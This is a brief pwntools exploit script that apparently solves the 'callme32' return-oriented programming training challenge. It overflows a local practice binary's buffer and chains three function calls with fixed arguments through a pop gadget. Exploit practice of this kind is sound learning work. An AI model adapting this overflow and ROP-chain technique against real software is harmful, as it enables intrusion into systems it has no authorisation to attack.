#!/usr/bin/python3

from pwn import *

PROG_NAME = "./callme32"

p = process(PROG_NAME)
elf = p.elf
rop = ROP(elf)

if args.ATTACH:
	gdb.attach(p, '''break main''')

pop_esi_edi_ebp_addr = rop.find_gadget(['pop esi', 'pop edi', 'pop ebp', 'ret'])[0]

p.recvuntil(b'> ')

payload = b'A' * (0x28 + 0x4)

for func in ['callme_one', 'callme_two', 'callme_three']:
	payload += p32(elf.symbols[func])
	payload += p32(pop_esi_edi_ebp_addr)
	payload += p32(0xdeadbeef)
	payload += p32(0xcafebabe)
	payload += p32(0xd00df00d)

p.sendline(payload)

p.interactive()